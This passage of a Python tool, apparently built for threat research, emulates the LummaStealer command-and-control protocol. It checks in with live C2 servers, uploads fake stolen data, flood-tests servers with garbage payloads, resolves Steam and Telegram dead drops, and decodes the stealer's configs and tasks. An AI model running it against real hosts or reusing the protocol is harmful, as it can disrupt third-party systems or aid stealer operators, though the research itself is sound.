            results["error_config"] = str(e)

        # Phase 5+6: Get tasks
        raw2 = self.phase5_second_checkin()
        if raw2:
            results["response2_size"] = len(raw2)
            results["response2_hex"] = raw2.hex()
            try:
                tasks = self.phase6_receive_tasks(raw2)
                results["tasks"] = tasks.raw_json
            except Exception as e:
                log.error(f"Failed to decrypt tasks: {e}")
                results["error_tasks"] = str(e)

        return results

    def run_full_emulation(self, fake_gen: FakeDataGenerator,
                           notify_delay: float = 2.0,
                           exfil_delay: float = 1.0) -> dict:
        """FULL mode: Complete protocol emulation with fake data.
        
        Exactly replicates the PCAP-observed sequence:
        1. Check-in → receive config
        2. pid=2 upload (system info)
        3. pid=3 upload (browser data)
        4. pid=1 upload (wallet/bulk data)
        5. msg=post notification
        6. msg=soft notification
        7. msg=steam notification
        8. msg=npp notification
        9. pid=1 upload (more data)
        10. msg=disc notification
        11. msg=scrn notification
        12. pid=1 uploads (remaining)
        13. Second check-in → receive tasks
        
        Args:
            fake_gen:       FakeDataGenerator instance
            notify_delay:   Delay between status notifications (seconds)
            exfil_delay:    Delay between data uploads (seconds)
        """
        log.info("=" * 60)
        log.info("MODE: Full protocol emulation")
        log.info("=" * 60)

        results = {"mode": "full", "c2_url": self.c2_url, "uid": self.uid,
                   "hwid": self.hwid, "phases": []}

        def record(phase: str, resp: Optional[bytes]):
            entry = {"phase": phase, "response_size": len(resp) if resp else 0}
            if resp:
                try:
                    entry["response_text"] = resp.decode('utf-8')
                except Exception:
                    entry["response_hex_head"] = resp[:64].hex()
            results["phases"].append(entry)
            return resp

        # Phase 1+2: Check-in and receive config
        raw = self.phase1_checkin()
        record("checkin1", raw)
        if raw and not self.dry_run:
            try:
                config = self.phase2_receive_config(raw)
                results["config"] = config.raw_json
            except Exception as e:
                log.error(f"Config decrypt failed: {e}")

        time.sleep(exfil_delay)

        # Phase 3a: pid=2 (system info) — first upload
        data_pid2 = fake_gen.generate_pid2_data()
        record("exfil_pid2", self.phase3_exfil(2, data_pid2))
        time.sleep(exfil_delay)

        # Phase 3b: pid=3 (browser data) — second upload
        data_pid3 = fake_gen.generate_pid3_data()
        record("exfil_pid3", self.phase3_exfil(3, data_pid3))
        time.sleep(exfil_delay)

        # Phase 3c: pid=1 (bulk data) — first bulk upload
        data_pid1_0 = fake_gen.generate_pid1_data(chunk_index=0)
        record("exfil_pid1_0", self.phase3_exfil(1, data_pid1_0))
        time.sleep(exfil_delay)

        # Phase 4: Module notifications (first batch: post, soft, steam, npp)
        for code in ["post", "soft", "steam", "npp"]:
            record(f"notify_{code}", self.phase4_notify(code))
            time.sleep(notify_delay)

        # Phase 3d: pid=1 (more data)
        data_pid1_1 = fake_gen.generate_pid1_data(chunk_index=1)
        record("exfil_pid1_1", self.phase3_exfil(1, data_pid1_1))
        time.sleep(exfil_delay)

        # Phase 4 continued: disc, scrn
        for code in ["disc", "scrn"]:
            record(f"notify_{code}", self.phase4_notify(code))
            time.sleep(notify_delay)

        # Phase 3e: pid=1 (remaining uploads)
        data_pid1_2 = fake_gen.generate_pid1_data(chunk_index=2)
        record("exfil_pid1_2", self.phase3_exfil(1, data_pid1_2))
        time.sleep(exfil_delay)

        data_pid1_3 = fake_gen.generate_pid1_data(chunk_index=2)
        record("exfil_pid1_3", self.phase3_exfil(1, data_pid1_3))
        time.sleep(exfil_delay)

        # Phase 5+6: Second check-in
        raw2 = self.phase5_second_checkin()
        record("checkin2", raw2)
        if raw2 and not self.dry_run:
            try:
                tasks = self.phase6_receive_tasks(raw2)
                results["tasks"] = tasks.raw_json
            except Exception as e:
                log.error(f"Tasks decrypt failed: {e}")

        return results

    def run_stress_test(self, payload_size_mb: float,
                        num_uploads: int = 10,
                        delay: float = 0.5) -> dict:
        """STRESS mode: Send large garbage payloads to test C2 resilience.
        
        Args:
            payload_size_mb: Size of each garbage payload in MB
            num_uploads:     Number of uploads to send
            delay:           Delay between uploads (seconds)
        """
        log.info("=" * 60)
        log.info(f"MODE: Stress test ({payload_size_mb}MB × {num_uploads} uploads)")
        log.info("=" * 60)

        results = {"mode": "stress", "payload_size_mb": payload_size_mb,
                   "num_uploads": num_uploads, "uploads": []}

        # Phase 1: Must check in first
        raw = self.phase1_checkin()
        if raw and not self.dry_run:
            try:
                self.phase2_receive_config(raw)
            except Exception:
                pass

        gen = FakeDataGenerator()
        for i in range(num_uploads):
            log.info(f"Stress upload {i+1}/{num_uploads} ({payload_size_mb}MB)")
            garbage = gen.generate_garbage_payload(payload_size_mb)
            pid = random.choice([1, 2, 3])
            try:
                resp = self.phase3_exfil(pid, garbage)
                results["uploads"].append({
                    "index": i, "pid": pid, "size": len(garbage),
                    "response_size": len(resp) if resp else 0,
                    "success": resp is not None,
                })
            except Exception as e:
                log.error(f"Upload {i+1} failed: {e}")
                results["uploads"].append({
                    "index": i, "pid": pid, "error": str(e),
                })
            time.sleep(delay)

        return results


# ─── CLI ──────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="LummaStealer C2 Protocol Emulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Operation Modes:
  intel     Connect to C2, retrieve config/tasks only (no data sent)
  full      Full protocol emulation with fake data
  stress    Stress test with large garbage payloads
  decode    Offline: decode a captured C2 response file

Examples:
  # Intel gathering (read-only)
  %(prog)s intel --c2 https://schorlf.cyou/ --uid 92c8cde... --proxy socks5://127.0.0.1:9050

  # Full emulation with fake data via Tor
  %(prog)s full --c2 https://target.c2/ --uid <campaign_id> --proxy socks5://127.0.0.1:9050

  # Stress test (10MB × 20 uploads)
  %(prog)s stress --c2 https://target.c2/ --uid <id> --size 10 --count 20

  # Offline decode
  %(prog)s decode --file /tmp/response.bin

  # Dry-run (shows requests without sending)
  %(prog)s full --c2 https://schorlf.cyou/ --uid 92c8cde... --dry-run

  # Scan all C2s + resolve DDR (Steam/Telegram)
  %(prog)s scan --uid 92c8cde...

  # Scan with additional Steam profile for DDR
  %(prog)s scan --uid 92c8cde... --steam-url https://steamcommunity.com/profiles/76561199880317058
""")

    parser.add_argument("mode", choices=["intel", "full", "stress", "decode", "scan"],
                        help="Operation mode")
    parser.add_argument("--c2", help="C2 server URL")
    parser.add_argument("--uid", help="Campaign ID (uid parameter)")
    parser.add_argument("--hwid", help="Hardware ID (auto-generated if omitted)")
    parser.add_argument("--proxy", help="Proxy URL (e.g. socks5://127.0.0.1:9050)")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout (sec)")
    parser.add_argument("--verify-ssl", action="store_true", help="Verify TLS certs")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print requests without sending")
    parser.add_argument("--output", "-o", help="Save results to JSON file")
    parser.add_argument("--verbose", "-v", action="count", default=0,
                        help="Increase verbosity (-v, -vv)")

    # Full mode options
    full_group = parser.add_argument_group("Full emulation options")
    full_group.add_argument("--computer-name", default="DESKTOP-A1B2C3D",
                            help="Fake computer name")
    full_group.add_argument("--username", default="JohnDoe", help="Fake username")
    full_group.add_argument("--fake-ip", default="203.0.113.42",
                            help="Fake victim IP shown in data")
    full_group.add_argument("--notify-delay", type=float, default=2.0,
                            help="Delay between notifications (sec)")
    full_group.add_argument("--exfil-delay", type=float, default=1.0,
                            help="Delay between uploads (sec)")
    full_group.add_argument("--garbage-mb", type=float, default=0,
                            help="Pad each upload to this size (MB)")

    # Stress mode options
    stress_group = parser.add_argument_group("Stress test options")
    stress_group.add_argument("--size", type=float, default=10,
                              help="Payload size in MB (default: 10)")
    stress_group.add_argument("--count", type=int, default=10,
                              help="Number of uploads (default: 10)")
    stress_group.add_argument("--stress-delay", type=float, default=0.5,
                              help="Delay between stress uploads (sec)")

    # Intel mode options
    intel_group = parser.add_argument_group("Intel mode options")
    intel_group.add_argument("--save-raw", metavar="DIR",
                             help="Save raw encrypted responses to files in DIR")

    # Decode mode options
    decode_group = parser.add_argument_group("Decode mode options")
    decode_group.add_argument("--file", help="Captured C2 response file to decode")

    # Scan/DDR mode options
    scan_group = parser.add_argument_group("Scan/DDR options")
    scan_group.add_argument("--steam-url",
                            help="Additional Steam profile URL for DDR resolution")
    scan_group.add_argument("--telegram-url",
                            help="Additional Telegram channel URL for DDR resolution")

    args = parser.parse_args()

    # Setup logging
    level = logging.WARNING
    if args.verbose >= 2:
        level = logging.DEBUG
    elif args.verbose >= 1:
        level = logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )

    # ── Scan mode (try all C2s) ───────────────────────────────────
    if args.mode == "scan":
        uid = args.uid
        if not uid:
            parser.error("--uid is required for scan mode")
        c2_list = list(SAMPLE_C2_URLS)
        if args.c2:
            # Prepend user-specified C2 if not already in list
            if args.c2.rstrip('/') not in [u.rstrip('/') for u in c2_list]:
                c2_list = [args.c2] + c2_list

        scan_timeout = args.timeout if args.timeout != 30 else 15
        results = {"mode": "scan", "uid": uid, "ddr_results": [], "c2_results": []}
        alive_count = 0

        # ── Phase A: Dead Drop Resolution ────────────────────────
        ddr_sources = STEAM_DDR_URLS + TELEGRAM_DDR_URLS
        if args.steam_url:
            ddr_sources = [args.steam_url] + [u for u in ddr_sources if u != args.steam_url]
        if args.telegram_url:
            ddr_sources = [args.telegram_url] + ddr_sources

        steam_urls_to_try = [u for u in ddr_sources if 'steamcommunity.com' in u]
        telegram_urls_to_try = [u for u in ddr_sources if 't.me/' in u]

        if steam_urls_to_try or telegram_urls_to_try:
            print(f"[*] Phase A: Dead Drop Resolution ({len(steam_urls_to_try)} Steam, "
                  f"{len(telegram_urls_to_try)} Telegram)")
            print()

            ddr_results = resolve_all_ddr(
                steam_urls=steam_urls_to_try,
                telegram_urls=telegram_urls_to_try,
                timeout=scan_timeout,
                proxy=args.proxy,
            )
            results["ddr_results"] = ddr_results

            for ddr in ddr_results:
                source = ddr["source"]
                domain = ddr.get("decoded_domain")
                if domain:
                    c2_url = ddr["c2_url"]
                    print(f"  [{source.upper()}] DDR resolved: {domain} -> {c2_url}")
                    # Add to scan list if not already present
                    if c2_url.rstrip('/') not in [u.rstrip('/') for u in c2_list]:
                        c2_list.insert(0, c2_url)  # Prioritize DDR-resolved C2
                        print(f"    -> Added to scan list (priority)")
                    else:
                        print(f"    -> Already in scan list")
                else:
                    print(f"  [{source.upper()}] DDR failed: {ddr['ddr_url']}")
                print()

        # ── Phase B: C2 Scan ─────────────────────────────────────
        print(f"[*] Phase B: Scanning {len(c2_list)} C2 URLs (timeout={scan_timeout}s each)...")
        print()

        for i, c2_url in enumerate(c2_list):
            entry = {"c2_url": c2_url, "status": "unknown"}
            print(f"[{i+1}/{len(c2_list)}] {c2_url}")

            emu = LummaC2Emulator(
                c2_url=c2_url,
                uid=uid,
                hwid=args.hwid,
                verify_ssl=args.verify_ssl,
                timeout=scan_timeout,
                proxy=args.proxy,
                dry_run=False,
                max_retries=0,  # No retries in scan mode (fast fail)
            )

            raw = emu.phase1_checkin()
            if raw is None:
                entry["status"] = "DOWN"
                entry["detail"] = "No response (timeout/connection error)"
                print(f"  -> DOWN (no response)")
            elif len(raw) < 40:
                entry["status"] = "UNEXPECTED"
                entry["detail"] = f"Short response ({len(raw)}B)"
                entry["response_hex"] = raw.hex()
                try:
                    entry["response_text"] = raw.decode('utf-8', errors='replace')
                except Exception:
                    pass
                print(f"  -> UNEXPECTED ({len(raw)}B): {raw[:80]}")
            else:
                # Try to decrypt
                try:
                    config = emu.phase2_receive_config(raw)
                    entry["status"] = "ALIVE"
                    entry["response_size"] = len(raw)
                    entry["config_version"] = config.version
                    entry["extensions_count"] = len(config.extensions)
                    entry["credential_paths_count"] = len(config.credential_paths)
                    alive_count += 1
                    print(f"  -> ALIVE! Config v{config.version}, "
                          f"{len(config.extensions)} extensions, "
                          f"{len(config.credential_paths)} cred paths")
                    # Also try to get tasks
                    try:
                        raw2 = emu.phase5_second_checkin()
                        if raw2 and len(raw2) >= 40:
                            tasks = emu.phase6_receive_tasks(raw2)
                            entry["tasks"] = tasks.raw_json
                            print(f"  -> Tasks: {len(tasks.tasks)} task(s)")
                    except Exception:
                        pass
                except Exception as e:
                    entry["status"] = "REACHABLE_BUT_DECRYPT_FAILED"
                    entry["response_size"] = len(raw)
                    entry["error"] = str(e)
                    print(f"  -> REACHABLE ({len(raw)}B) but decrypt failed: {e}")

            results["c2_results"].append(entry)
            print()

        # Summary
        print("=" * 60)
        print(f"SCAN COMPLETE: {alive_count}/{len(c2_list)} C2s alive")
        print("=" * 60)
        if results["ddr_results"]:
            print("\nDDR Results:")
            for ddr in results["ddr_results"]:
                icon = "✓" if ddr.get("decoded_domain") else "✗"
                src = ddr["source"].upper()
                domain = ddr.get("decoded_domain", "FAILED")
                print(f"  [{icon}] {src:10s} {ddr['ddr_url'][:50]:50s} -> {domain}")
        print("\nC2 Status:")
        for entry in results["c2_results"]:
            status_icon = {"ALIVE": "✓", "DOWN": "✗", "UNEXPECTED": "?",
                          "REACHABLE_BUT_DECRYPT_FAILED": "~"}.get(entry["status"], "?")
            print(f"  [{status_icon}] {entry['c2_url']:45s} {entry['status']}")

        if args.output:
            Path(args.output).write_text(
                json.dumps(results, indent=2, ensure_ascii=False, default=str))
            log.info(f"Results saved to {args.output}")
        return

    # ── Decode mode (offline) ────────────────────────────────────
    if args.mode == "decode":
        if not args.file:
            parser.error("--file is required for decode mode")
        data = Path(args.file).read_bytes()
        print(f"[*] Input: {args.file} ({len(data)} bytes)")
        plaintext = chacha20_decrypt(data)
        config, json_offset = extract_json(plaintext)
        charxor_key = None
        if json_offset >= 8:
            key_bytes = plaintext[:8]
            charxor_key = struct.unpack('<4H', key_bytes)
            print(f"[*] Detected char-XOR key: {key_bytes.hex()} "
                  f"(chars: [{', '.join(f'0x{k:04x}' for k in charxor_key)}])")
        decoded = decode_value(config, charxor_key=charxor_key)
        print(json.dumps(decoded, indent=2, ensure_ascii=False))
        if args.output:
            Path(args.output).write_text(
                json.dumps(decoded, indent=2, ensure_ascii=False))
            print(f"[+] Saved to {args.output}")
        return

    # ── Online modes require --c2 and --uid ──────────────────────
    if not args.c2 or not args.uid:
        parser.error("--c2 and --uid are required for intel/full/stress modes")

    emu = LummaC2Emulator(
        c2_url=args.c2,
        uid=args.uid,
        hwid=args.hwid,
        verify_ssl=args.verify_ssl,
        timeout=args.timeout,
        proxy=args.proxy,
        dry_run=args.dry_run,
    )

    results = {}

    if args.mode == "intel":
        results = emu.run_intel_only()

        # Save raw encrypted responses to files for offline analysis
        if args.save_raw:
            raw_dir = Path(args.save_raw)
            raw_dir.mkdir(parents=True, exist_ok=True)
            host = emu.c2_url.replace('https://', '').replace('http://', '').rstrip('/').replace('/', '_')
            if results.get("response1_hex"):
                f1 = raw_dir / f"{host}_response1_config.bin"
                f1.write_bytes(bytes.fromhex(results["response1_hex"]))
                log.info(f"Raw config response saved to {f1} ({results['response1_size']}B)")
            if results.get("response2_hex"):
                f2 = raw_dir / f"{host}_response2_tasks.bin"
                f2.write_bytes(bytes.fromhex(results["response2_hex"]))
                log.info(f"Raw tasks response saved to {f2} ({results['response2_size']}B)")

    elif args.mode == "full":
        identity = FakeIdentity(
            computer_name=args.computer_name,
            username=args.username,
            ip_address=args.fake_ip,
        )
        fake_gen = FakeDataGenerator(
            identity=identity,
            garbage_size_mb=args.garbage_mb,
        )
        results = emu.run_full_emulation(
            fake_gen=fake_gen,
            notify_delay=args.notify_delay,
            exfil_delay=args.exfil_delay,
        )

    elif args.mode == "stress":
        results = emu.run_stress_test(
            payload_size_mb=args.size,
            num_uploads=args.count,
            delay=args.stress_delay,
        )

    # Output
    if args.output:
        Path(args.output).write_text(
            json.dumps(results, indent=2, ensure_ascii=False, default=str))
        log.info(f"Results saved to {args.output}")

    # Print summary
    if results.get("config"):
        print("\n" + "=" * 60)
        print("OPERATOR TARGET CONFIG RETRIEVED")
        print("=" * 60)
        cfg = results["config"]
        if isinstance(cfg, dict):
            print(f"  Version:     {cfg.get('v', '?')}")
            print(f"  Stealer:     {cfg.get('se', '?')}")
            print(f"  Extensions:  {len(cfg.get('ex', []))}")
            print(f"  Cred paths:  {len(cfg.get('c', []))}")
            if cfg.get('ex'):
                print(f"\n  Top targeted extensions:")
                for ex in cfg['ex'][:10]:
                    name = ex.get('ez', '?')
                    ext_id = ex.get('en', '?')
                    print(f"    {name:30s} {ext_id}")
                if len(cfg['ex']) > 10:
                    print(f"    ... and {len(cfg['ex']) - 10} more")

    if results.get("tasks"):
        print("\n" + "=" * 60)
        print("SECONDARY TASKS RETRIEVED")
        print("=" * 60)
        has_real_task = False
        for task in results["tasks"]:
            # Check for C2 error response (no tasks assigned)
            if "error" in task:
                err = task["error"]
                print(f"  C2 response: {err.get('error_msg', 'unknown error')} "
                      f"(code={err.get('error_code', '?')})")
                print("  → No tasks assigned to this UID")
                continue
            has_real_task = True
            url = task.get('u', '?')
            ft = task.get('ft', '?')
            enabled = task.get('e', '?')
            ft_desc = {0: "download", 1: "shell", 2: "powershell_iex"}.get(ft, str(ft))
            print(f"  URL: {url}")
            print(f"  Type: {ft} ({ft_desc}), Enabled: {enabled}")
        if not has_real_task:
            print("  (Operator has not configured secondary payloads for this campaign)")
    elif "error_tasks" in results:
        print("\n" + "=" * 60)
        print("SECONDARY TASKS")
        print("=" * 60)
        print(f"  Error: {results['error_tasks']}")


if __name__ == "__main__":
    main()
